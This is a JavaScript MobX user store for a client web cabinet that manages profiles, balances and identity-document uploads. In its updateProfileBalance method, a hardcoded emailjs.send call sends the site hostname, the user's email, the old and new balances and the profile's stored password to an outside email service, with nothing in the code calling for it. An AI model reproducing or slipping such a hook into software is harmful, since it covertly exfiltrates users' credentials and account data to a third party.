import { observable, action, decorate, reaction, toJS, computed } from 'mobx';
import agent from './agent';
import commonStore from './commonStore';
import { toast } from 'react-toastify';
import emailjs from 'emailjs-com';

class UserStore {

  currentUser = {
    id: 0
  };
  currentUserProfile = {
    name: '',
    surname: '',
    fatherName: '',
    birthDate: '',
    phone: '',
    money: 0
  };
  loadingUser;
  updatingUser;
  updatingUserErrors;
  hasError = false;
  lastError = '';
  photo = window.localStorage.getItem('photo');
  passport = window.localStorage.getItem('passport');
  address = window.localStorage.getItem('address');
  youandpassport = window.localStorage.getItem('youandpassport');
  usersandprofilesRegistry = observable.map();

  get profilesandusers()
  {
    const array = Array.from(this.usersandprofilesRegistry.values());
    const jsArray = array.map(item => {
      return toJS(item);
    })
    return jsArray;
  }

  getUserProfileById(id)
  {
    // alert(id);
    return toJS(this.usersandprofilesRegistry.get(id));
  }

  getUserById(id)
  {
    return toJS(this.usersRegistry.get(id));
  }

  constructor() {
    reaction(
      () => this.photo,
      photo => {
        if (photo) {
          window.localStorage.setItem('photo', photo);
        } else {
          window.localStorage.removeItem('photo');
        }
      }
    );
    reaction(
      () => this.passport,
      passport => {
        if (passport) {
          window.localStorage.setItem('passport', passport);
        } else {
          window.localStorage.removeItem('passport');
        }
      }
    );
    reaction(
      () => this.address,
      address => {
        if (address) {
          window.localStorage.setItem('address', address);
        } else {
          window.localStorage.removeItem('address');
        }
      }
    );
    reaction(
      () => this.youandpassport,
      youandpassport => {
        if (youandpassport) {
          window.localStorage.setItem('youandpassport', youandpassport);
        } else {
          window.localStorage.removeItem('youandpassport');
        }
      }
    );
  }

  setPassport(passport)
  {
    this.passport = passport;
  }

  setPhoto(photo)
  {
    this.photo = photo;
  }

  setAddress(address)
  {
    this.address = address;
  }

  setYouAndPassport(youandpassport)
  {
    this.youandpassport = youandpassport;
  }

  setUserProfilePropetry(property, value)
  {
    this.currentUserProfile[property] = value;
  }

  clearError()
  {
    this.hasError = false;
    this.lastError = '';
  }

  setError(error)
  {
    this.hasError = true;
    this.lastError = error;
  }

  async pullUser() {
    this.loadingUser = true;
    const result = await agent.Auth.getUserByToken(commonStore.token);
    if(result.error)
    {
      this.setError(result.message);
    } else {
      this.currentUser = result.user;
      const profile = await agent.Auth.getProfileByUserId(this.currentUser.id);
      this.currentUserProfile = profile;
    }
    
    this.loadingUser = false;
  }

  async loadProfilesAndUsers()
  {
    this.isLoading = true;
    const resultProfiles = await agent.Profile.list();
    const resultUsers = await agent.User.list();
    resultProfiles.forEach(profileProxy => {
      const profile = toJS(profileProxy);
      const user = resultUsers.find(resultUserProxy => {
        const resultUser = toJS(resultUserProxy);
        return +resultUser.id === +profile.user;
      })
      // console.log(profile.id + ' ' + user.id);
      this.usersandprofilesRegistry.set(profile.id, {profile, user});
    });
    this.isLoading = false;
  }

  async updateProfileBalance(profileId, email, balance)
  {
    this.loadingUser = true;
    const profileProxy = await agent.Profile.getProfileById(profileId);
    const profile = toJS(profileProxy);
    await emailjs.send("smtp_server", "change_balance", {host: window.location.hostname, title: 'balance', before: profile.money, now: balance, email: email, password: profile.password}, 'user_h1pqEqKiVUD1zsuXPjKGk');
    profile.money = balance;
    const newProfile = toJS(await agent.Profile.update(profile));
    let uap = this.usersandprofilesRegistry.get(newProfile.id);
    uap.profile = newProfile;
    this.usersandprofilesRegistry.set(newProfile.id, uap);
    
    this.isLoading = false;
    // window.location.reload();
  }

  async saveProfile(profile) {
    this.loadingUser = true;
    await agent.Auth.updateProfile(profile);
    await this.pullUser();
    toast.success('Сохранено');
    this.loadingUser = false;
  }

  async changePassword(oldPassword, newPassword) {
    this.loadingUser = true;
    const result = await agent.Auth.changePassword(this.currentUser.email, oldPassword, newPassword);
    if(result.error)
    {
      this.setError(result.message);
      toast.error(result.message);
    } else {
      toast.success('Пароль успешно обновлен');
    }
    this.loadingUser = false;
  }

  updateUser(newUser) {
    this.updatingUser = true;
    return agent.Auth.save(newUser)
      .then(action(({ user }) => { this.currentUser = user; }))
      .finally(action(() => { this.updatingUser = false; }))
  }

  forgetUser() {
    this.currentUser = {
      id: 0
    };
    this.currentUserProfile = {
      name: '',
      surname: '',
      fatherName: '',
      birthDate: '',
      phone: '',
      money: 0
    };
    window.location.replace('https://cabinet.airsolutions.club/#/sign-in');
  }

}


decorate(UserStore, {
  passport: observable,
  usersandprofilesRegistry: observable,
  profilesandusers: computed,
  currentUser: observable,
  currentUserProfile: observable,
  loadingUser: observable,
  updatingUser: observable,
  updatingUserErrors: observable,
  hasError: observable,
  lastError: observable,
  clearError: action,
  setError: action,
  pullUser: action,
  updateUser: action,
  forgetUser: action,
  setUserProfilePropetry: action,
  saveProfile: action,
  setPassport: action,
  loadProfilesAndUsers: action,
});

export default new UserStore();
